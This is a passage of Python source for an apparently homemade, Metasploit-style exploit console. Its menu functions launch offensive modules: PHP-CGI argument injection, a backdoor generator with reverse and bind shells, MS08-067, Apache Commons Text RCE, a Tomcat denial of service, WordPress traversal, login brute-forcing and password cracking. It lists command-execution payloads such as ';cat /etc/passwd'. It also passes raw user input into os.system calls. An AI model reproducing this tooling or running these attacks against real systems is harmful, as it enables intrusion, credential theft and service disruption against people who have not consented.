OPTIONS       | DISCREPTIONS
--------------|----------------------
VULN_URL      | specify target vulnerable url.
CHECK_STRING  | specify a string to check if execution was successful.
PAYLOAD       | specify the paylaod.

you will specifiy these options when you run or exploit it!
""")
        serverphpcgiarginjection()
    elif scconsole123 == "show payloads":
        print("""
""" + color.green + """;echo system($_GET["cmd"]);//""" + color.white + """   ---> Command execution payload.

""" + color.green + """;cat /etc/passwd""" + color.white + """  ---> remote code execute cat payload.
""")
        serverphpcgiarginjection()
    elif scconsole123 == "run":
        os.system('python exploits/server/php-cgi-arg-injection.py')
        serverphpcgiarginjection()
    elif scconsole123 == "exploit":
        os.system('python exploits/server/php-cgi-arg-injection.py')
        serverphpcgiarginjection()
    elif scconsole123 == "unuse":
        print("unusing server/php-cgi-arg-injection.")
        time.sleep(0.5)
        Console()
    elif scconsole123 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def auxiliarypasswordcrackingcrackpassword():
    scconsole124 = input("sc~" + color.red + "(auxiliary/password_cracking/crack_password)" + color.white + ">")
    if scconsole124 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        auxiliarypasswordcrackingcrackpassword()
    elif scconsole124 == "clear":
        os.system('clear')
        auxiliarypasswordcrackingcrackpassword()
    elif scconsole124 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
HASH_TYPE     | specify the hash type.
HASH          | specify the hash to crack.
WORDLIST      | specify the wordlist to start cracking.

you will specifiy these options when you run or exploit it!
""")
        auxiliarypasswordcrackingcrackpassword()
    elif scconsole124 == "run":
        os.system('python exploits/auxiliary/password_cracking/crack_password.py')
        auxiliarypasswordcrackingcrackpassword()
    elif scconsole124 == "exploit":
        os.system('python exploits/auxiliary/password_cracking/crack_password.py')
        auxiliarypasswordcrackingcrackpassword()
    elif scconsole124 == "unuse":
        print("unusing auxiliary/password_cracking/crack_password.")
        time.sleep(0.5)
        Console()
    elif scconsole124 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def multicve20250282():
    scconsole124 = input("sc~" + color.red + "(multi/cve-2025-0282)" + color.white + ">")
    if scconsole124 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        multicve20250282()
    elif scconsole124 == "clear":
        os.system('clear')
        multicve20250282()
    elif scconsole124 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify target ip address.
LOCAL_SHELL   | specify the local shell path.

you will specifiy these options when you run or exploit it!
""")
        multicve20250282()
    elif scconsole124 == "run":
        targetipadd12 = input("Enter target IP ADDRESS: ")
        localshellpath = input("Enter local shell path: ")
        os.system(f'python exploits/multi/cve-2025-0282.py {targetipadd12} {localshellpath}')
        multicve20250282()
    elif scconsole124 == "exploit":
        targetipadd13 = input("Enter target IP ADDRESS: ")
        localshellpath1 = input("Enter local shell path: ")
        os.system(f'python exploits/multi/cve-2025-0282.py {targetipadd13} {localshellpath1}')
        multicve20250282()
    elif scconsole124 == "unuse":
        print("unusing multi/cve-2025-0282.")
        time.sleep(0.5)
        Console()
    elif scconsole124 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def multigeneratebackdoor():
    scconsole125 = input("sc~" + color.red + "(multi/generate_backdoor)" + color.white + ">")
    if scconsole125 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
show payloads ---> shows the payloads you can use in this exploit.
""")
        multigeneratebackdoor()
    elif scconsole125 == "clear":
        os.system('clear')
        multigeneratebackdoor()
    elif scconsole125 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
LHOST         | specify the listening host.
LPORT         | specify the listening port.
OUTPUT        | specify the output name to save the backdoor.

you will specifiy these options when you run or exploit it!
""")
        multigeneratebackdoor()
    elif scconsole125 == "show payloads":
        print("""
""" + color.green + """reverse_tcp""" + color.white + """ ---> trys to get a reverse shell from target, then connects back to the attacker.

""" + color.green + """bind_tcp""" + color.white + """ ---> trys to get a reverse shell from target, then connects back to the attacker.
""")
        multigeneratebackdoor()
    elif scconsole125 == "run":
        os.system('python exploits/multi/generate_backdoor.py')
        multigeneratebackdoor()
    elif scconsole125 == "exploit":
        os.system('python exploits/multi/generate_backdoor.py')
        multigeneratebackdoor()
    elif scconsole125 == "unuse":
        print("unusing multi/generate_backdoor.")
        time.sleep(0.5)
        Console()
    elif scconsole125 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def multinclistener():
    scconsole126 = input("sc~" + color.red + "(multi/nc-listener)" + color.white + ">")
    if scconsole126 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        multinclistener()
    elif scconsole126 == "clear":
        os.system('clear')
        multinclistener()
    elif scconsole126 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
LPORT         | specify the listening port.

you will specifiy these options when you run or exploit it!
""")
        multinclistener()
    elif scconsole126 == "run":
        listenerport342 = int(input("Enter the listening port: "))
        os.system(f'python exploits/multi/nc-listener.py {listenerport342}')
        multinclistener()
    elif scconsole126 == "exploit":
        listenerport343 = int(input("Enter the listening port: "))
        os.system(f'python exploits/multi/nc-listener.py {listenerport343}')
        multinclistener()
    elif scconsole126 == "unuse":
        print("unusing multi/nc-listener.")
        time.sleep(0.5)
        Console()
    elif scconsole126 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def windowsms08067netapi():
    scconsole127 = input("sc~" + color.red + "(windows/ms08_067_netapi)" + color.white + ">")
    if scconsole127 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        windowsms08067netapi()
    elif scconsole127 == "clear":
        os.system('clear')
        windowsms08067netapi()
    elif scconsole127 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target ip address.
LHOST         | specify the listening host.
LPORT         | specify the listening port.

you will specifiy these options when you run or exploit it!
""")
        windowsms08067netapi()
    elif scconsole127 == "run":
        os.system('python exploits/windows/ms08_067_netapi.py')
        windowsms08067netapi()
    elif scconsole127 == "exploit":
        os.system('python exploits/windows/ms08_067_netapi.py')
        windowsms08067netapi()
    elif scconsole127 == "unuse":
        print("unusing windows/ms08_067_netapi.")
        time.sleep(0.5)
        Console()
    elif scconsole127 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def phpWordPressCore62DirectoryTraversal():
    scconsole128 = input("sc~" + color.red + "(php/WordPress_Core_6-2_Directory_Traversal)" + color.white + ">")
    if scconsole128 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        phpWordPressCore62DirectoryTraversal()
    elif scconsole128 == "clear":
        os.system('clear')
        phpWordPressCore62DirectoryTraversal()
    elif scconsole128 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the target url.

you will specifiy these options when you run or exploit it!
""")
        phpWordPressCore62DirectoryTraversal()
    elif scconsole128 == "run":
        os.system('python exploits/php/WordPress_Core_6-2_Directory_Traversal.py')
        phpWordPressCore62DirectoryTraversal()
    elif scconsole128 == "exploit":
        os.system('python exploits/php/WordPress_Core_6-2_Directory_Traversal.py')
        phpWordPressCore62DirectoryTraversal()
    elif scconsole128 == "unuse":
        print("unusing php/WordPress_Core_6-2_Directory_Traversal.")
        time.sleep(0.5)
        Console()
    elif scconsole128 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def dosApacheCommonsFileUploadandApacheTomcatDoS():
    scconsole129 = input("sc~" + color.red + "(dos/Apache_Commons_FileUpload_and_Apache_Tomcat_DoS)" + color.white + ">")
    if scconsole129 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        dosApacheCommonsFileUploadandApacheTomcatDoS()
    elif scconsole129 == "clear":
        os.system('clear')
        dosApacheCommonsFileUploadandApacheTomcatDoS()
    elif scconsole129 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the target url.
N_REQUESTS    | specify the number of requests (default 10).

you will specifiy these options when you run or exploit it!
""")
        dosApacheCommonsFileUploadandApacheTomcatDoS()
    elif scconsole129 == "run":
        targeturltodos = input("Enter target URL: ")
        numberofrequests = int(input("Enter the number of requests: "))
        os.system(f'ruby exploits/dos/Apache_Commons_FileUpload_and_Apache_Tomcat_DoS.rb -u {targeturltodos} -n {numberofrequests}')
        dosApacheCommonsFileUploadandApacheTomcatDoS()
    elif scconsole129 == "exploit":
        targeturltodos2 = input("Enter target URL: ")
        numberofrequests2 = int(input("Enter the number of requests: "))
        os.system(f'ruby exploits/dos/Apache_Commons_FileUpload_and_Apache_Tomcat_DoS.rb -u {targeturltodos2} -n {numberofrequests2}')
        dosApacheCommonsFileUploadandApacheTomcatDoS()
    elif scconsole129 == "unuse":
        print("unusing dos/Apache_Commons_FileUpload_and_Apache_Tomcat_DoS.")
        time.sleep(0.5)
        Console()
    elif scconsole129 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def siteApachecommonstextRCE():
    scconsole130 = input("sc~" + color.red + "(site/Apache_commons_text_RCE)" + color.white + ">")
    if scconsole130 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        siteApachecommonstextRCE()
    elif scconsole130 == "clear":
        os.system('clear')
        siteApachecommonstextRCE()
    elif scconsole130 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
TARGET_IP     | specify the target ip address.
LHOST         | specify the listening host.
LPORT         | specify the listening port.

you will specifiy these options when you run or exploit it!
""")
        siteApachecommonstextRCE()
    elif scconsole130 == "run":
        targethostip = input("Enter target ip address: ")
        callbackip = input("Enter the callback ip address(listening host): ")
        callbackport = input("Enter the callback port(listening port): ")
        os.system(f'python exploits/site/Apache_commons_text_RCE.py {targethostip} {callbackip} {callbackport}')
        siteApachecommonstextRCE()
    elif scconsole130 == "exploit":
        targethostip2 = input("Enter target ip address: ")
        callbackip2 = input("Enter the callback ip address(listening host): ")
        callbackport2 = input("Enter the callback port(listening port): ")
        os.system(f'python exploits/site/Apache_commons_text_RCE.py {targethostip2} {callbackip2} {callbackport2}')
        siteApachecommonstextRCE()
    elif scconsole130 == "unuse":
        print("unusing site/Apache_commons_text_RCE.")
        time.sleep(0.5)
        Console()
    elif scconsole130 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def scannerhttpoptions():
    scconsole131 = input("sc~" + color.red + "(scanner/http-options)" + color.white + ">")
    if scconsole131 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        scannerhttpoptions()
    elif scconsole131 == "clear":
        os.system('clear')
        scannerhttpoptions()
    elif scconsole131 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target url.

you will specifiy these options when you run or exploit it!
""")
        scannerhttpoptions()
    elif scconsole131 == "run":
        targethostip3 = input("Enter target url: ")
        os.system(f'python exploits/scanner/http-options.py --rhost {targethostip3}')
        scannerhttpoptions()
    elif scconsole131 == "exploit":
        targethostip4 = input("Enter target url: ")
        os.system(f'python exploits/scanner/http-options.py --rhost {targethostip4}')
        scannerhttpoptions()
    elif scconsole131 == "unuse":
        print("unusing scanner/http-options.")
        time.sleep(0.5)
        Console()
    elif scconsole131 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def scannerhttpsoptions():
    scconsole132 = input("sc~" + color.red + "(scanner/https-options)" + color.white + ">")
    if scconsole132 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        scannerhttpsoptions()
    elif scconsole132 == "clear":
        os.system('clear')
        scannerhttpsoptions()
    elif scconsole132 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target url.

you will specifiy these options when you run or exploit it!
""")
        scannerhttpsoptions()
    elif scconsole132 == "run":
        targethostip5 = input("Enter target url: ")
        os.system(f'python exploits/scanner/https-options.py --rhost {targethostip5}')
        scannerhttpsoptions()
    elif scconsole132 == "exploit":
        targethostip6 = input("Enter target url: ")
        os.system(f'python exploits/scanner/https-options.py --rhost {targethostip6}')
        scannerhttpsoptions()
    elif scconsole132 == "unuse":
        print("unusing scanner/https-options.")
        time.sleep(0.5)
        Console()
    elif scconsole132 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def scannerserverscanner():
    scconsole133 = input("sc~" + color.red + "(scanner/server-scanner)" + color.white + ">")
    if scconsole133 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        scannerserverscanner()
    elif scconsole133 == "clear":
        os.system('clear')
        scannerserverscanner()
    elif scconsole133 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target url.

you will specifiy these options when you run or exploit it!
""")
        scannerserverscanner()
    elif scconsole133 == "run":
        os.system('python exploits/scanner/server-scanner.py')
        scannerserverscanner()
    elif scconsole133 == "exploit":
        os.system('python exploits/scanner/server-scanner.py')
        scannerserverscanner()
    elif scconsole133 == "unuse":
        print("unusing scanner/server-scanner.")
        time.sleep(0.5)
        Console()
    elif scconsole133 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def siteBludit():
    scconsole134 = input("sc~" + color.red + "(site/Bludit)" + color.white + ">")
    if scconsole134 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        siteBludit()
    elif scconsole134 == "clear":
        os.system('clear')
        siteBludit()
    elif scconsole134 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
LOGIN_URL     | enter target login url.
USERNAMELIST  | enter the path of usernamelist.
PASSWORDLIST  | enter the path of passwordlist.

you will specifiy these options when you run or exploit it!
""")
        siteBludit()
    elif scconsole134 == "run":
        targeturladdress = input("Enter target login page: ")
        usernamelist = input("Enter the path of username list: ")
        passwordlist = input("Enter the path of password list: ")
        os.system(f'python exploits/site/Bludit.py -l {targeturladdress} -u {usernamelist} -p {passwordlist}')
        siteBludit()
    elif scconsole134 == "exploit":
        targeturladdress2 = input("Enter target login page: ")
        usernamelist2 = input("Enter the path of username list: ")
        passwordlist2 = input("Enter the path of password list: ")
        os.system(f'python exploits/site/Bludit.py -l {targeturladdress2} -u {usernamelist2} -p {passwordlist2}')
        siteBludit()
    elif scconsole134 == "unuse":
        print("unusing site/Bludit.")
        time.sleep(0.5)
        Console()
    elif scconsole134 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def auxiliarywordpressdepicterplugin361():
    scconsole135 = input("sc~" + color.red + "(auxiliary/wordpress-depicter-plugin-3-6-1)" + color.white + ">")
    if scconsole135 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        auxiliarywordpressdepicterplugin361()
    elif scconsole135 == "clear":
        os.system('clear')
        auxiliarywordpressdepicterplugin361()
    elif scconsole135 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url.
EXTRACTION_MODE  | specify the extraction mode: check , admin .

check = vulnerability check.
admin = admin details.

you will specifiy these options when you run or exploit it!
""")
        auxiliarywordpressdepicterplugin361()
    elif scconsole135 == "run":
        targetwordpressurl = input("Enter target URL(example: test.com): ")
        extractionmode = input("Enter the extraction mode: ")
        os.system(f'python exploits/auxiliary/wordpress-depicter-plugin-3-6-1.py -u {targetwordpressurl} -m {extractionmode}')
        auxiliarywordpressdepicterplugin361()
    elif scconsole135 == "exploit":
        targetwordpressurl2 = input("Enter target URL(example: test.com): ")
        extractionmode2 = input("Enter the extraction mode: ")
        os.system(f'python exploits/auxiliary/wordpress-depicter-plugin-3-6-1.py -u {targetwordpressurl2} -m {extractionmode2}')
        auxiliarywordpressdepicterplugin361()
    elif scconsole135 == "unuse":
        print("unusing auxiliary/wordpress-depicter-plugin-3-6-1.")
        time.sleep(0.5)
        Console()
    elif scconsole135 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def auxiliarywordpresscore62DirectoryTraversal():
    scconsole136 = input("sc~" + color.red + "(auxiliary/wordpress_core_6-2_Directory-Traversal)" + color.white + ">")
    if scconsole136 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        auxiliarywordpresscore62DirectoryTraversal()
    elif scconsole136 == "clear":
        os.system('clear')
        auxiliarywordpresscore62DirectoryTraversal()
    elif scconsole136 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url.

you will specifiy these options when you run or exploit it!
""")
        auxiliarywordpresscore62DirectoryTraversal()
    elif scconsole136 == "run":
        os.system('python exploits/auxiliary/wordpress_core_6-2_Directory-Traversal.py')
        auxiliarywordpresscore62DirectoryTraversal()
    elif scconsole136 == "exploit":
        os.system('python exploits/auxiliary/wordpress_core_6-2_Directory-Traversal.py')
        auxiliarywordpresscore62DirectoryTraversal()
    elif scconsole136 == "unuse":
        print("unusing auxiliary/wordpress_core_6-2_Directory-Traversal.")
        time.sleep(0.5)
        Console()
    elif scconsole136 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def auxiliarysqlivulntest():
    scconsole137 = input("sc~" + color.red + "(auxiliary/sqli-vuln-test)" + color.white + ">")
    if scconsole137 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        auxiliarysqlivulntest()
    elif scconsole137 == "clear":
        os.system('clear')
        auxiliarysqlivulntest()
    elif scconsole137 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url.

you will specifiy these options when you run or exploit it!
""")
        auxiliarysqlivulntest()
    elif scconsole137 == "run":
        os.system('python exploits/auxiliary/sqli-vuln-test.py')
        auxiliarysqlivulntest()
    elif scconsole137 == "exploit":
        os.system('python exploits/auxiliary/sqli-vuln-test.py')
        auxiliarysqlivulntest()
    elif scconsole137 == "unuse":
        print("unusing auxiliary/sqli-vuln-test.")
        time.sleep(0.5)
        Console()
    elif scconsole137 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def auxiliaryfindns():
    scconsole138 = input("sc~" + color.red + "(auxiliary/findns)" + color.white + ">")
    if scconsole138 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        auxiliaryfindns()
    elif scconsole138 == "clear":
        os.system('clear')
        auxiliaryfindns()
    elif scconsole138 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url.

you will specifiy these options when you run or exploit it!
""")
        auxiliaryfindns()
    elif scconsole138 == "run":
        os.system('python exploits/auxiliary/findns.py')
        auxiliaryfindns()
    elif scconsole138 == "exploit":
        os.system('python exploits/auxiliary/findns.py')
        auxiliaryfindns()
    elif scconsole138 == "unuse":
        print("unusing auxiliary/findns.")
        time.sleep(0.5)
        Console()
    elif scconsole138 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def auxiliarydnsenum():
    scconsole139 = input("sc~" + color.red + "(auxiliary/dnsenum)" + color.white + ">")
    if scconsole139 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        auxiliarydnsenum()
    elif scconsole139 == "clear":
        os.system('clear')
        auxiliarydnsenum()
    elif scconsole139 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url.

you will specifiy these options when you run or exploit it!
""")
        auxiliarydnsenum()
    elif scconsole139 == "run":
        os.system('python exploits/auxiliary/dnsenum.py')
        auxiliarydnsenum()
    elif scconsole139 == "exploit":
        os.system('python exploits/auxiliary/dnsenum.py')
        auxiliarydnsenum()
    elif scconsole139 == "unuse":
        print("unusing auxiliary/dnsenum.")
        time.sleep(0.5)
        Console()
    elif scconsole139 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def auxiliarylbdetect():
    scconsole140 = input("sc~" + color.red + "(auxiliary/lbdetect)" + color.white + ">")
    if scconsole140 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        auxiliarylbdetect()
    elif scconsole140 == "clear":
        os.system('clear')
        auxiliarylbdetect()
    elif scconsole140 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url.

you will specifiy these options when you run or exploit it!
""")
        auxiliarylbdetect()
    elif scconsole140 == "run":
        os.system('python exploits/auxiliary/lbdetect.py')
        auxiliarylbdetect()
    elif scconsole140 == "exploit":
        os.system('python exploits/auxiliary/lbdetect.py')
        auxiliarylbdetect()
    elif scconsole140 == "unuse":
        print("unusing auxiliary/lbdetect.")
        time.sleep(0.5)
        Console()
    elif scconsole140 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def auxiliarybase64decrypt():
    scconsole141 = input("sc~" + color.red + "(auxiliary/base64_decrypt)" + color.white + ">")
    if scconsole141 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        auxiliarybase64decrypt()
    elif scconsole141 == "clear":
        os.system('clear')
        auxiliarybase64decrypt()
    elif scconsole141 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
ENCODED_BASE64   | specify the encoded base64.

you will specifiy these options when you run or exploit it!
""")
        auxiliarybase64decrypt()
    elif scconsole141 == "run":
        os.system('python exploits/auxiliary/base64_decrypt.py')
        auxiliarybase64decrypt()
    elif scconsole141 == "exploit":
        os.system('python exploits/auxiliary/base64_decrypt.py')
        auxiliarybase64decrypt()
    elif scconsole141 == "unuse":
        print("unusing auxiliary/base64_decrypt.")
        time.sleep(0.5)
        Console()
    elif scconsole141 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def windowsShellSend():
    scconsole142 = input("sc~" + color.red + "(windows/ShellSend)" + color.white + ">")
    if scconsole142 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        windowsShellSend()
    elif scconsole142 == "clear":
        os.system('clear')
        windowsShellSend()
    elif scconsole142 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.
RPORT            | specify the target port.
LHOST            | specify the listener host.
LPORT            | specify the listener port.
SHELLCODE        | specify the shellcode.

You can create the shellcode with scshellcodegenerator.

you will specifiy these options when you run or exploit it!
""")
        windowsShellSend()
    elif scconsole142 == "run":
        os.system('python exploits/windows/ShellSend.py')
        windowsShellSend()
    elif scconsole142 == "exploit":
        os.system('python exploits/windows/ShellSend.py')
        windowsShellSend()
    elif scconsole142 == "unuse":
        print("unusing windows/ShellSend.")
        time.sleep(0.5)
        Console()
    elif scconsole142 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def auxiliaryhashdetect():
    scconsole143 = input("sc~" + color.red + "(auxiliary/hashdetect)" + color.white + ">")
    if scconsole143 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        auxiliaryhashdetect()
    elif scconsole143 == "clear":
        os.system('clear')
        auxiliaryhashdetect()
    elif scconsole143 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
HASH             | specify the hash.

you will specifiy these options when you run or exploit it!
""")
        auxiliaryhashdetect()
    elif scconsole143 == "run":
        os.system('python exploits/auxiliary/hashdetect.py')
        auxiliaryhashdetect()
    elif scconsole143 == "exploit":
        os.system('python exploits/auxiliary/hashdetect.py')
        auxiliaryhashdetect()
    elif scconsole143 == "unuse":
        print("unusing auxiliary/hashdetect.")
        time.sleep(0.5)
        Console()
    elif scconsole143 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def auxiliaryhttpbruteforce():
    scconsole144 = input("sc~" + color.red + "(auxiliary/http-bruteforce)" + color.white + ">")
    if scconsole144 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        auxiliaryhttpbruteforce()
    elif scconsole144 == "clear":
        os.system('clear')
        auxiliaryhttpbruteforce()
    elif scconsole144 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target login url(http).
USERNAME         | specify the username that you know to login with it.
PASSWORDLIST     | specify the passwordlist.
USERNAME_FIELD   | specify the username field.
PASSWORD_FIELD   | specify the password field.
SUCCESS_STRING   | specify the success string.
DELAY            | specify the delay between requests in seconds.

you will specifiy these options when you run or exploit it!
""")
        auxiliaryhttpbruteforce()
    elif scconsole144 == "run":
        targeturllogin = input("Enter target login URL (e.g. http://example.com): ")
        usernameone = input("Enter the username to try the passwords on it(one username not list): ")
        brutepasslist = input("Enter the passwordlist: ")
        usernamefield6 = input("Enter the USERNAME_FIELD: ")
        passwordfield7 = input("Enter the PASSWORD_FIELD: ")
        successstring = input("Enter the SUCCESS_STRING (e.g. Welcome Admin): ")
        delay1 = input("Enter the Delay in senconds: ")
        os.system(f'python exploits/auxiliary/http-bruteforce.py -u {targeturllogin} -U {usernameone} -p {brutepasslist} -ufield {usernamefield6} -pfield {passwordfield7} -s "{successstring}" -d {delay1}')
        auxiliaryhttpbruteforce()
    elif scconsole144 == "exploit":
        targeturllogin2 = input("Enter target login URL (e.g. http://example.com): ")
        usernameone2 = input("Enter the username to try the passwords on it(one username not list): ")
        brutepasslist2 = input("Enter the passwordlist: ")
        usernamefield8 = input("Enter the USERNAME_FIELD: ")
        passwordfield9 = input("Enter the PASSWORD_FIELD: ")
        successstring2 = input("Enter the SUCCESS_STRING (e.g. Welcome Admin): ")
        delay2 = input("Enter the Delay in senconds: ")
        os.system(f'python exploits/auxiliary/http-bruteforce.py -u {targeturllogin2} -U {usernameone2} -p {brutepasslist2} -ufield {usernamefield8} -pfield {passwordfield9} -s "{successstring2}" -d {delay2}')
        auxiliaryhttpbruteforce()
    elif scconsole144 == "unuse":
        print("unusing auxiliary/http-bruteforce.")
        time.sleep(0.5)
        Console()
    elif scconsole144 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
